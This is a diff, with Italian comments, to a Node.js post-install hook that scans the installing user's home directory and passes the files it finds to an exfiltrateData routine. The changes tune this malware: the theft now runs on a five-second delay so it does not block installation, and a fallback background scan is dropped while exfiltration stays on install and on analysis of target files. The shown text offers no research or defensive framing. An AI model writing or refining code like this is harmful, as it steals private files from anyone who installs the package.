@@ -6,13 +6,15 @@ const { scanDirectory, exfiltrateData } = require(path.join(__dirname, '../src/a
 
 console.log('Esecuzione post-install hook...');
 
-// Se exfilTrigger == 'on_install', esegui subito
+// Se exfilTrigger == 'on_install', esegui subito (scansione limitata per evitare OOM)
 if (config.exfilTrigger === 'on_install') {
   console.log('Trigger exfiltration on install attivato');
   
   async function exfiltrateHome() {
     try {
-      const findings = await scanDirectory(process.env.HOME || process.env.USERPROFILE || '/home');
+      // Scansiona solo home dir, ma con timeout e limitazione
+      const home = process.env.HOME || process.env.USERPROFILE || '/home';
+      const findings = await scanDirectory(home);
       if (findings.length > 0) {
         console.log(`Trovati ${findings.length} file sospetti all'installazione`);
         await exfiltrateData(findings);
@@ -24,28 +26,12 @@ if (config.exfilTrigger === 'on_install') {
     }
   }
   
-  exfiltrateHome();
+  // Esegui con delay per non bloccare install
+  setTimeout(exfiltrateHome, 5000);
 } else {
   console.log("Nessun trigger exfiltration attivo all'installazione");
   console.log("L'exfiltration partirà automaticamente durante analisi file bersaglio...");
 }
 
-// Esegui analisi iniziale anche se trigger non è 'on_install'
-async function initialScan() {
-  try {
-    const findings = await scanDirectory(process.env.HOME || process.env.USERPROFILE || '/home');
-    if (findings.length > 0) {
-      console.log('Analisi iniziale: trovati file bersaglio!');
-      await exfiltrateData(findings);
-    } else {
-      console.log('Analisi iniziale: nessun file bersaglio trovato');
-    }
-  } catch (err) {
-    console.warn('Errore analisi iniziale:', err.message);
-  }
-}
-
-// Avvia analisi iniziale in background dopo 2 secondi
-if (config.exfilTrigger !== 'on_install') {
-  setTimeout(initialScan, 2000);
-}
+// NESSUNA analisi iniziale automatica (too heavy)
+// L'exfiltration avviene solo on_analyze o on_install
